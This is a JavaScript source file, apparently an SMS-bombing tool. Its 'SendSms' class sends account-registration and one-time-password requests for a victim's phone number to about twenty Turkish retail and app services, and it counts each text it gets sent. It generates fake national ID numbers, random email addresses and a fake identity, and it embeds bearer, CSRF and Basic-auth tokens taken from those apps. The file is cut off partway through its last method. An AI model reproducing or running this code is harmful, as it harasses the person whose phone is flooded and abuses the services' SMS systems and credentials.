const axios = require('axios');
const randomstring = require('random-string'); 
const { randomInt } = require('crypto'); 
class SendSms {
  constructor(phone) {
    this.adet = 0;
    let rakam = [];
    let tcNo = "";
    rakam.push(randomInt(1, 10)); 
    for (let i = 1; i < 9; i++) {
      rakam.push(randomInt(0, 10)); 
    }
    rakam.push((((rakam[0] + rakam[2] + rakam[4] + rakam[6] + rakam[8]) * 7 - (rakam[1] + rakam[3] + rakam[5] + rakam[7])) % 10));
    rakam.push(((rakam[0] + rakam[1] + rakam[2] + rakam[3] + rakam[4] + rakam[5] + rakam[6] + rakam[7] + rakam[8] + rakam[9]) % 10));
    for (let r of rakam) {
      tcNo += r.toString();
    }
    this.tc = tcNo;
    this.phone = phone.toString();
    this.mail = randomstring({ length: 22, charset: 'abcdefghijklmnoprstuvwxyz' }) + "@gmail.com";
  }
  async KahveDunyasi() {
    try {
      const url = "https://api.kahvedunyasi.com:443/api/v1/auth/account/register/phone-number";
      const headers = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0",
        "Accept": "application/json, text/plain, */*",
        "Accept-Encoding": "gzip, deflate, br",
        "Content-Type": "application/json",
        "X-Language-Id": "tr-TR",
        "X-Client-Platform": "web",
        "Origin": "https://www.kahvedunyasi.com",
        "Dnt": "1",
        "Sec-Gpc": "1",
        "Referer": "https://www.kahvedunyasi.com/",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-site",
        "Priority": "u=0",
        "Te": "trailers",
        "Connection": "keep-alive"
      };
      const json = { "countryCode": "90", "phoneNumber": this.phone };
      const r = await axios.post(url, json, { headers, timeout: 6000 });
      if (r.data.processStatus === "Success") {
        console.log(`\x1b[32m[+] \x1b[0mBaşarılı! ${this.phone} --> api.kahvedunyasi.com`);
        this.adet += 1;
      } else {
        throw new Error();
      }
    } catch {
      console.log(`\x1b[31m[-] \x1b[0mBaşarısız! ${this.phone} --> api.kahvedunyasi.com`);
    }
  }
  async Wmf() {
    try {
      const wmf = await axios.post("https://www.wmf.com.tr/users/register/", {
        "confirm": "true",
        "date_of_birth": "1956-03-01",
        "email": this.mail,
        "email_allowed": "true",
        "first_name": "Memati",
        "gender": "male",
        "last_name": "Bas",
        "password": "31ABC..abc31",
        "phone": `0${this.phone}`
      }, { timeout: 6000 });
      if (wmf.status === 202) {
        console.log(`\x1b[32m[+] \x1b[0mBaşarılı! ${this.phone} --> wmf.com.tr`);
        this.adet += 1;
      } else {
        throw new Error();
      }
    } catch {
      console.log(`\x1b[31m[-] \x1b[0mBaşarısız! ${this.phone} --> wmf.com.tr`);
    }
  }
  async Bim() {
    try {
      const bim = await axios.post("https://bim.veesk.net:443/service/v1.0/account/login", { "phone": this.phone }, { timeout: 6000 });
      if (bim.status === 200) {
        console.log(`\x1b[32m[+] \x1b[0mBaşarılı! ${this.phone} --> bim.veesk.net`);
        this.adet += 1;
      } else {
        throw new Error();
      }
    } catch {
      console.log(`\x1b[31m[-] \x1b[0mBaşarısız! ${this.phone} --> bim.veesk.net`);
    }
  }
  async Englishhome() {
    try {
      const url = "https://www.englishhome.com:443/api/member/sendOtp";
      const headers = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0",
        "Accept": "*/*",
        "Referer": "https://www.englishhome.com/",
        "Content-Type": "application/json",
        "Origin": "https://www.englishhome.com",
        "Dnt": "1",
        "Sec-Gpc": "1",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-origin",
        "Priority": "u=0",
        "Te": "trailers"
      };
      const json = { "Phone": this.phone, "XID": "" };
      const r = await axios.post(url, json, { headers, timeout: 6000 });
      if (r.data.isError === false) {
        console.log(`\x1b[32m[+] \x1b[0mBaşarılı! ${this.phone} --> englishhome.com`);
        this.adet += 1;
      } else {
        throw new Error();
      }
    } catch {
      console.log(`\x1b[31m[-] \x1b[0mBaşarısız! ${this.phone} --> englishhome.com`);
    }
  }
  async Suiste() {
    try {
      const url = "https://suiste.com:443/api/auth/code";
      const headers = {
        "Content-Type": "application/x-www-form-urlencoded; charset=utf-8",
        "X-Mobillium-Device-Brand": "Apple",
        "Accept": "application/json",
        "X-Mobillium-Os-Type": "iOS",
        "X-Mobillium-Device-Model": "iPhone",
        "Mobillium-Device-Id": "2390ED28-075E-465A-96DA-DFE8F84EB330",
        "Accept-Language": "en",
        "X-Mobillium-Device-Id": "2390ED28-075E-465A-96DA-DFE8F84EB330",
        "Accept-Encoding": "gzip, deflate, br",
        "X-Mobillium-App-Build-Number": "1469",
        "User-Agent": "suiste/1.7.11 (com.mobillium.suiste; build:1469; iOS 15.8.3) Alamofire/5.9.1",
        "X-Mobillium-Os-Version": "15.8.3",
        "X-Mobillium-App-Version": "1.7.11"
      };
      const data = {
        "action": "register",
        "device_id": "2390ED28-075E-465A-96DA-DFE8F84EB330",
        "full_name": "Memati Bas",
        "gsm": this.phone,
        "is_advertisement": "1",
        "is_contract": "1",
        "password": "31MeMaTi31"
      };
      const r = await axios.post(url, new URLSearchParams(data), { headers, timeout: 6000 });
      if (r.data.code === "common.success") {
        console.log(`\x1b[32m[+] \x1b[0mBaşarılı! ${this.phone} --> suiste.com`);
        this.adet += 1;
      } else {
        throw new Error();
      }
    } catch {
      console.log(`\x1b[31m[-] \x1b[0mBaşarısız! ${this.phone} --> suiste.com`);
    }
  }
  async KimGb() {
    try {
      const r = await axios.post("https://3uptzlakwi.execute-api.eu-west-1.amazonaws.com:443/api/auth/send-otp", { "msisdn": `90${this.phone}` }, { timeout: 6000 });
      if (r.status === 200) {
        console.log(`\x1b[32m[+] \x1b[0mBaşarılı! ${this.phone} --> 3uptzlakwi.execute-api.eu-west-1.amazonaws.com`);
        this.adet += 1;
      } else {
        throw new Error();
      }
    } catch {
      console.log(`\x1b[31m[-] \x1b[0mBaşarısız! ${this.phone} --> 3uptzlakwi.execute-api.eu-west-1.amazonaws.com`);
    }
  }
  async Evidea() {
    try {
      const url = "https://www.evidea.com:443/users/register/";
      const headers = {
        "Content-Type": "multipart/form-data; boundary=fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi",
        "X-Project-Name": "undefined",
        "Accept": "application/json, text/plain, */*",
        "X-App-Type": "akinon-mobile",
        "X-Requested-With": "XMLHttpRequest",
        "Accept-Language": "tr-TR,tr;q=0.9",
        "Cache-Control": "no-store",
        "Accept-Encoding": "gzip, deflate",
        "X-App-Device": "ios",
        "Referer": "https://www.evidea.com/",
        "User-Agent": "Evidea/1 CFNetwork/1335.0.3 Darwin/21.6.0",
        "X-Csrftoken": "7NdJbWSYnOdm70YVLIyzmylZwWbqLFbtsrcCQdLAEbnx7a5Tq4njjS3gEElZxYps"
      };
      const data = `--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name="first_name"\r\n\r\nMemati\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name="last_name"\r\n\r\nBas\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name="email"\r\n\r\n${this.mail}\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name="email_allowed"\r\n\r\nfalse\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name="sms_allowed"\r\n\r\ntrue\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name="password"\r\n\r\n31ABC..abc31\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name="phone"\r\n\r\n0${this.phone}\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name="confirm"\r\n\r\ntrue\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi--\r\n`;
      const r = await axios.post(url, data, { headers, timeout: 6000 });
      if (r.status === 202) {
        console.log(`\x1b[32m[+] \x1b[0mBaşarılı! ${this.phone} --> evidea.com`);
        this.adet += 1;
      } else {
        throw new Error();
      }
    } catch {
      console.log(`\x1b[31m[-] \x1b[0mBaşarısız! ${this.phone} --> evidea.com`);
    }
  }
  async Ucdortbes() {
    try {
      const url = "https://api.345dijital.com:443/api/users/register";
      const headers = {
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/json",
        "Accept-Encoding": "gzip, deflate",
        "User-Agent": "AriPlusMobile/21 CFNetwork/1335.0.3.2 Darwin/21.6.0",
        "Accept-Language": "en-US,en;q=0.9",
        "Authorization": "null",
        "Connection": "close"
      };
      const json = { "email": "", "name": "Memati", "phoneNumber": `+90${this.phone}`, "surname": "Bas" };
      const r = await axios.post(url, json, { headers, timeout: 6000 });
      if (r.data.error === "E-Posta veya telefon zaten kayıtlı!") {
        console.log(`\x1b[31m[-] \x1b[0mBaşarısız! ${this.phone} --> api.345dijital.com`);
      } else {
        throw new Error();
      }
    } catch {
      console.log(`\x1b[32m[+] \x1b[0mBaşarılı! ${this.phone} --> api.345dijital.com`);
      this.adet += 1;
    }
  }
  async TiklaGelsin() {
    try {
      const url = "https://svc.apps.tiklagelsin.com:443/user/graphql";
      const headers = {
        "Content-Type": "application/json",
        "X-Merchant-Type": "0",
        "Accept": "*/*",
        "Appversion": "2.4.1",
        "Accept-Language": "en-US,en;q=0.9",
        "Accept-Encoding": "gzip, deflate",
        "X-No-Auth": "true",
        "User-Agent": "TiklaGelsin/809 CFNetwork/1335.0.3.2 Darwin/21.6.0",
        "X-Device-Type": "2"
      };
      const json = {
        "operationName": "GENERATE_OTP",
        "query": "mutation GENERATE_OTP($phone: String, $challenge: String, $deviceUniqueId: String) {\n  generateOtp(phone: $phone, challenge: $challenge, deviceUniqueId: $deviceUniqueId)\n}\n",
        "variables": { "challenge": "3d6f9ff9-86ce-4bf3-8ba9-4a85ca975e68", "deviceUniqueId": "720932D5-47BD-46CD-A4B8-086EC49F81AB", "phone": `+90${this.phone}` }
      };
      const r = await axios.post(url, json, { headers, timeout: 6000 });
      if (r.data.data.generateOtp === true) {
        console.log(`\x1b[32m[+] \x1b[0mBaşarılı! ${this.phone} --> svc.apps.tiklagelsin.com`);
        this.adet += 1;
      } else {
        throw new Error();
      }
    } catch {
      console.log(`\x1b[31m[-] \x1b[0mBaşarısız! ${this.phone} --> svc.apps.tiklagelsin.com`);
    }
  }
  async Naosstars() {
    try {
      const url = "https://api.naosstars.com:443/api/smsSend/9c9fa861-cc5d-43b0-b4ea-1b541be15350";
      const headers = {
        "Uniqid": "9c9fa861-cc5d-43c0-b4ea-1b541be15351",
        "User-Agent": "naosstars/1.0030 CFNetwork/1335.0.3.2 Darwin/21.6.0",
        "Access-Control-Allow-Origin": "*",
        "Locale": "en-TR",
        "Version": "1.0030",
        "Os": "ios",
        "Apiurl": "https://api.naosstars.com/api/",
        "Device-Id": "D41CE5F3-53BB-42CF-8611-B4FE7529C9BC",
        "Platform": "ios",
        "Accept-Language": "en-US,en;q=0.9",
        "Timezone": "Europe/Istanbul",
        "Globaluuidv4": "d57bd5d2-cf1e-420c-b43d-61117cf9b517",
        "Timezoneoffset": "-180",
        "Accept": "application/json",
        "Content-Type": "application/json; charset=utf-8",
        "Accept-Encoding": "gzip, deflate",
        "Apitype": "mobile_app"
      };
      const json = { "telephone": `+90${this.phone}`, "type": "register" };
      const r = await axios.post(url, json, { headers, timeout: 6000 });
      if (r.status === 200) {
        console.log(`\x1b[32m[+] \x1b[0mBaşarılı! ${this.phone} --> api.naosstars.com`);
        this.adet += 1;
      } else {
        throw new Error();
      }
    } catch {
      console.log(`\x1b[31m[-] \x1b[0mBaşarısız! ${this.phone} --> api.naosstars.com`);
    }
  }
  async Koton() {
    try {
      const url = "https://www.koton.com:443/users/register/";
      const headers = {
        "Content-Type": "multipart/form-data; boundary=sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk",
        "X-Project-Name": "rn-env",
        "Accept": "application/json, text/plain, */*",
        "X-App-Type": "akinon-mobile",
        "X-Requested-With": "XMLHttpRequest",
        "Accept-Language": "en-US,en;q=0.9",
        "Cache-Control": "no-store",
        "Accept-Encoding": "gzip, deflate",
        "X-App-Device": "ios",
        "Referer": "https://www.koton.com/",
        "User-Agent": "Koton/1 CFNetwork/1335.0.3.2 Darwin/21.6.0",
        "X-Csrftoken": "5DDwCmziQhjSP9iGhYE956HHw7wGbEhk5kef26XMFwhELJAWeaPK3A3vufxzuWcz"
      };
      const data = `--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name="first_name"\r\n\r\nMemati\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name="last_name"\r\n\r\nBas\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name="email"\r\n\r\n${this.mail}\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name="password"\r\n\r\n31ABC..abc31\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name="phone"\r\n\r\n0${this.phone}\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name="confirm"\r\n\r\ntrue\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name="sms_allowed"\r\n\r\ntrue\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name="email_allowed"\r\n\r\ntrue\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name="date_of_birth"\r\n\r\n1993-07-02\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name="call_allowed"\r\n\r\ntrue\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name="gender"\r\n\r\n\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk--\r\n`;
      const r = await axios.post(url, data, { headers, timeout: 6000 });
      if (r.status === 202) {
        console.log(`\x1b[32m[+] \x1b[0mBaşarılı! ${this.phone} --> koton.com`);
        this.adet += 1;
      } else {
        throw new Error();
      }
    } catch {
      console.log(`\x1b[31m[-] \x1b[0mBaşarısız! ${this.phone} --> koton.com`);
    }
  }
  async Hayatsu() {
    try {
      const url = "https://api.hayatsu.com.tr:443/api/SignUp/SendOtp";
      const headers = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
        "Accept": "application/json, text/javascript, */*; q=0.01",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate, br",
        "Referer": "https://www.hayatsu.com.tr/",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "Authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJqdGkiOiJhMTA5MWQ1ZS0wYjg3LTRjYWQtOWIxZi0yNTllMDI1MjY0MmMiLCJsb2dpbmRhdGUiOiIxOS4wMS4yMDI0IDIyOjU3OjM3Iiwibm90dXNlciI6InRydWUiLCJwaG9uZU51bWJlciI6IiIsImV4cCI6MTcyMTI0NjI1NywiaXNzIjoiaHR0cHM6Ly9oYXlhdHN1LmNvbS50ciIsImF1ZCI6Imh0dHBzOi8vaGF5YXRzdS5jb20udHIifQ.Cip4hOxGPVz7R2eBPbq95k6EoICTnPLW9o2eDY6qKMM",
        "Origin": "https://www.hayatsu.com.tr",
        "Dnt": "1",
        "Sec-Gpc": "1",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-site",
        "Te": "trailers"
      };
      const data = { "mobilePhoneNumber": this.phone, "actionType": "register" };
      const r = await axios.post(url, new URLSearchParams(data), { headers, timeout: 6000 });
      if (r.data.is_success === true) {
        console.log(`\x1b[32m[+] \x1b[0mBaşarılı! ${this.phone} --> api.hayatsu.com.tr`);
        this.adet += 1;
      } else {
        throw new Error();
      }
    } catch {
      console.log(`\x1b[31m[-] \x1b[0mBaşarısız! ${this.phone} --> api.hayatsu.com.tr`);
    }
  }
  async Hizliecza() {
    try {
      const url = "https://prod.hizliecza.net:443/mobil/account/sendOTP";
      const headers = {
        "Accept": "application/json",
        "Content-Type": "application/json",
        "Accept-Encoding": "gzip, deflate, br",
        "User-Agent": "hizliecza/31 CFNetwork/1335.0.3.4 Darwin/21.6.0",
        "Accept-Language": "en-GB,en;q=0.9",
        "Authorization": "Bearer null"
      };
      const json = { "otpOperationType": 1, "phoneNumber": `+90${this.phone}` };
      const r = await axios.post(url, json, { headers, timeout: 6000 });
      if (r.status === 200) {
        console.log(`\x1b[32m[+] \x1b[0mBaşarılı! ${this.phone} --> prod.hizliecza.net`);
        this.adet += 1;
      } else {
        throw new Error();
      }
    } catch {
      console.log(`\x1b[31m[-] \x1b[0mBaşarısız! ${this.phone} --> prod.hizliecza.net`);
    }
  }
  async Metro() {
    try {
      const url = "https://mobile.metro-tr.com:443/api/mobileAuth/validateSmsSend";
      const headers = {
        "Accept": "*/*",
        "Content-Type": "application/json; charset=utf-8",
        "Accept-Encoding": "gzip, deflate, br",
        "Applicationversion": "2.4.1",
        "Applicationplatform": "2",
        "User-Agent": "Metro Turkiye/2.4.1 (com.mcctr.mobileapplication; build:4; iOS 15.8.3) Alamofire/4.9.1",
        "Accept-Language": "en-BA;q=1.0, tr-BA;q=0.9, bs-BA;q=0.8",
        "Connection": "keep-alive"
      };
      const json = { "methodType": "2", "mobilePhoneNumber": this.phone };
      const r = await axios.post(url, json, { headers, timeout: 6000 });
      if (r.data.status === "success") {
        console.log(`\x1b[32m[+] \x1b[0mBaşarılı! ${this.phone} --> mobile.metro-tr.com`);
        this.adet += 1;
      } else {
        throw new Error();
      }
    } catch {
      console.log(`\x1b[31m[-] \x1b[0mBaşarısız! ${this.phone} --> mobile.metro-tr.com`);
    }
  }
  async File() {
    try {
      const url = "https://api.filemarket.com.tr:443/v1/otp/send";
      const headers = {
        "Accept": "*/*",
        "Content-Type": "application/json",
        "User-Agent": "filemarket/2022060120013 CFNetwork/1335.0.3.2 Darwin/21.6.0",
        "X-Os": "IOS",
        "X-Version": "1.7",
        "Accept-Language": "en-US,en;q=0.9",
        "Accept-Encoding": "gzip, deflate"
      };
      const json = { "mobilePhoneNumber": `90${this.phone}` };
      const r = await axios.post(url, json, { headers, timeout: 6000 });
      if (r.data.responseType === "SUCCESS") {
        console.log(`\x1b[32m[+] \x1b[0mBaşarılı! ${this.phone} --> api.filemarket.com.tr`);
        this.adet += 1;
      } else {
        throw new Error();
      }
    } catch {
      console.log(`\x1b[31m[-] \x1b[0mBaşarısız! ${this.phone} --> api.filemarket.com.tr`);
    }
  }
  async Akasya() {
    try {
      const url = "https://akasyaapi.poilabs.com:443/v1/en/sms";
      const headers = {
        "Accept": "*/*",
        "Content-Type": "application/json",
        "X-Platform-Token": "9f493307-d252-4053-8c96-62e7c90271f5",
        "User-Agent": "Akasya/2.0.13 (com.poilabs.akasyaavm; build:2; iOS 15.8.3) Alamofire/4.9.1",
        "Accept-Language": "en-BA;q=1.0, tr-BA;q=0.9, bs-BA;q=0.8"
      };
      const json = { "phone": this.phone };
      const r = await axios.post(url, json, { headers, timeout: 6000 });
      if (r.data.result === "SMS sended succesfully!") {
        console.log(`\x1b[32m[+] \x1b[0mBaşarılı! ${this.phone} --> akasyaapi.poilabs.com`);
        this.adet += 1;
      } else {
        throw new Error();
      }
    } catch {
      console.log(`\x1b[31m[-] \x1b[0mBaşarısız! ${this.phone} --> akasyaapi.poilabs.com`);
    }
  }
  async Akbati() {
    try {
      const url = "https://akbatiapi.poilabs.com:443/v1/en/sms";
      const headers = {
        "Accept": "*/*",
        "Content-Type": "application/json",
        "X-Platform-Token": "a2fe21af-b575-4cd7-ad9d-081177c239a3",
        "User-Agent": "Akdbat",
        "Accept-Language": "en-BA;q=1.0, tr-BA;q=0.9, bs-BA;q=0.8"
      };
      const json = { "phone": this.phone };
      const r = await axios.post(url, json, { headers, timeout: 6000 });
      if (r.data.result === "SMS sended succesfully!") {
        console.log(`\x1b[32m[+] \x1b[0mBaşarılı! ${this.phone} --> akbatiapi.poilabs.com`);
        this.adet += 1;
      } else {
        throw new Error();
      }
    } catch {
      console.log(`\x1b[31m[-] \x1b[0mBaşarısız! ${this.phone} --> akbatiapi.poilabs.com`);
    }
  }
  async Komagene() {
    try {
      const url = "https://gateway.komagene.com.tr:443/auth/auth/smskodugonder";
      const json = { "FirmaId": 32, "Telefon": this.phone };
      const headers = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0",
        "Accept": "*/*",
        "Accept-Encoding": "gzip, deflate, br",
        "Referer": "https://www.komagene.com.tr/",
        "Anonymousclientid": "0dbf392b-ab10-48b3-5cda-31f3c19816e6",
        "Firmaid": "32",
        "X-Guatamala-Kirsallari": "@@b7c5EAAAACwZI8p8fLJ8p6nOq9kTLL+0GQ1wCB4VzTQSq0sekKeEdAoQGZZo+7fQw+IYp38V0I/4JUhQQvrq1NPw4mHZm68xgkb/rmJ3y67lFK/uc+uq",
        "Content-Type": "application/json",
        "Origin": "https://www.komagene.com.tr",
        "Dnt": "1",
        "Sec-Gpc": "1",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-site",
        "Priority": "u=0",
        "Te": "trailers",
        "Connection": "keep-alive"
      };
      const r = await axios.post(url, json, { headers, timeout: 6000 });
      if (r.data.Success === true) {
        console.log(`\x1b[32m[+] \x1b[0mBaşarılı! ${this.phone} --> gateway.komagene.com`);
        this.adet += 1;
      } else {
        throw new Error();
      }
    } catch {
      console.log(`\x1b[31m[-] \x1b[0mBaşarısız! ${this.phone} --> gateway.komagene.com`);
    }
  }
  async Porty() {
    try {
      const url = "https://panel.porty.tech:443/api.php?";
      const headers = {
        "Accept": "*/*",
        "Content-Type": "application/json; charset=UTF-8",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "en-US,en;q=0.9",
        "User-Agent": "Porty/1 CFNetwork/1335.0.3.4 Darwin/21.6.0",
        "Token": "q2zS6kX7WYFRwVYArDdM66x72dR6hnZASZ"
      };
      const json = { "job": "start_login", "phone": this.phone };
      const r = await axios.post(url, json, { headers, timeout: 6000 });
      if (r.data.status === "success") {
        console.log(`\x1b[32m[+] \x1b[0mBaşarılı! ${this.phone} --> panel.porty.tech`);
        this.adet += 1;
      } else {
        throw new Error();
      }
    } catch {
      console.log(`\x1b[31m[-] \x1b[0mBaşarısız! ${this.phone} --> panel.porty.tech`);
    }
  }
  async Tasdelen() {
    try {
      const url = "https://tasdelen.sufirmam.com:3300/mobile/send-otp";
      const headers = {
        "Accept": "*/*",
        "Content-Type": "application/json",
        "Accept-Encoding": "gzip, deflate, br",
        "User-Agent": "Tasdelen/5.9 (com.tasdelenapp; build:1; iOS 15.8.3) Alamofire/5.4.3",
        "Accept-Language": "en-BA;q=1.0, tr-BA;q=0.9, bs-BA;q=0.8",
        "Connection": "keep-alive"
      };
      const json = { "phone": this.phone };
      const r = await axios.post(url, json, { headers, timeout: 6000 });
      if (r.data.result === true) {
        console.log(`\x1b[32m[+] \x1b[0mBaşarılı! ${this.phone} --> tasdelen.sufirmam.com`);
        this.adet += 1;
      } else {
        throw new Error();
      }
    } catch {
      console.log(`\x1b[31m[-] \x1b[0mBaşarısız! ${this.phone} --> tasdelen.sufirmam.com`);
    }
  }
  async Uysal() {
    try {
      const url = "https://api.uysalmarket.com.tr:443/api/mobile-users/send-register-sms";
      const headers = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0",
        "Accept": "application/json, text/plain, */*",
        "Accept-Encoding": "gzip, deflate, br",
        "Content-Type": "application/json;charset=utf-8",
        "Origin": "https://www.uysalmarket.com.tr",
        "Dnt": "1",
        "Sec-Gpc": "1",
        "Referer": "https://www.uysalmarket.com.tr/",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-site",
        "Priority": "u=0",
        "Te": "trailers"
      };
      const json = { "phone_number": this.phone };
      const r = await axios.post(url, json, { headers, timeout: 6000 });
      if (r.status === 200) {
        console.log(`\x1b[32m[+] \x1b[0mBaşarılı! ${this.phone} --> api.uysalmarket.com.tr`);
        this.adet += 1;
      } else {
        throw new Error();
      }
    } catch {
      console.log(`\x1b[31m[-] \x1b[0mBaşarısız! ${this.phone} --> api.uysalmarket.com.tr`);
    }
  }
  async Yapp() {
    try {
      const url = "https://yapp.com.tr:443/api/mobile/v1/register";
      const headers = {
        "Accept": "application/json",
        "Content-Type": "application/json",
        "X-Content-Language": "en",
        "Accept-Language": "en-BA;q=1, tr-BA;q=0.9, bs-BA;q=0.8",
        "Authorization": "Bearer ",
        "User-Agent": "YappApp/1.1.5 (iPhone; iOS 15.8.3; Scale/3.00)",
        "Accept-Encoding": "gzip, deflate, br"
      };
      const json = {
        "app_version": "1.1.5",
        "code": "tr",
        "device_model": "iPhone8,5",
        "device_name": "Memati",
        "device_type": "I",
        "device_version": "15.8.3",
        "email": this.mail,
        "firstname": "Memati",
        "is_allow_to_communication": "1",
        "language_id": "2",
        "lastname": "Bas",
        "phone_number": this.phone,
        "sms_code": ""
      };
      const r = await axios.post(url, json, { headers, timeout: 6000 });
      if (r.status === 200) {
        console.log(`\x1b[32m[+] \x1b[0mBaşarılı! ${this.phone} --> yapp.com.tr`);
        this.adet += 1;
      } else {
        throw new Error();
      }
    } catch {
      console.log(`\x1b[31m[-] \x1b[0mBaşarısız! ${this.phone} --> yapp.com.tr`);
    }
  }
  async YilmazTicaret() {
    try {
      const url = "https://app.buyursungelsin.com:443/api/customer/form/checkx";
      const headers = {
        "Accept": "*/*",
        "Content-Type": "multipart/form-data; boundary=q9dvlvKdAlrYErhMAn0nqaS09bnzem0qvDgMz_DPLA0BQZ7RZFgS9q.BuuuYRH7_DlX9dl",
        "Accept-Encoding": "gzip, deflate, br",
        "Authorization": "Basic Z2Vsc2luYXBwOjR1N3ghQSVEKkctS2FOZFJnVWtYcDJzNXY4eS9CP0UoSCtNYlFlU2hWbVlxM3Q2dzl6JEMmRilKQE5jUmZValduWnI0dTd4IUElRCpHLUthUGRTZ1ZrWXAyczV2OHkvQj9FKEgrTWJRZVRoV21acTR0Nnc5eiRDJkYpSkBOY1Jm",
        "User-Agent": "Ylmaz/38 CFNetwork/1335.0.3.4 Darwin/21.6.0",
        "Accept-Language": "en-GB,en;q=0.9"
      };
      const data = `--q9dvlvKdAlrYErhMAn0nqaS09bnzem0qvDgMz_DPLA0BQZ7RZFgS9q.BuuuYRH7_DlX9dl\r\ncontent-disposition: form-data; name="fonksiyon"\r\n\r\ncustomer/form/checkx\r\n--q9dvlvKdAlrYErhMAn0nqaS09bnzem0qvDgMz_DPLA0BQZ7RZFgS9q.BuuuYRH7_DlX9dl\r\ncontent-disposition: form-data; name="method"\r\n\r\nPOST\r\n--q9dvlvKdAlrYErhMAn0nqaS09bnzem0qvDgMz_DPLA0BQZ7RZFgS9q.BuuuYRH7_DlX9dl\r\ncontent-disposition: form-data; name="telephone"\r\n\r\n0 (${this.phone.substring(0,3)}) ${this.phone.substring(3,6)} ${this.phone.substring(6,8)} ${this.phone.substring(8)}\r\n--q9dvlvKdAlrYErhMAn0nqaS09bnzem0qvDgMz_DPLA0BQZ7RZFgS9q.BuuuYRH7_DlX9dl\r\ncontent-disposition: form-data; name="token"\r\n\r\nd7841d399a16d0060d3b8a76bf70542e\r\n--q9dvlvKdAlrYErhMAn0nqaS09bnzem0qvDgMz_DPLA0BQZ7RZFgS9q.BuuuYRH7_DlX9dl--\r\n`;
      const r = await axios.post(url, data, { headers, timeout: 6000 });
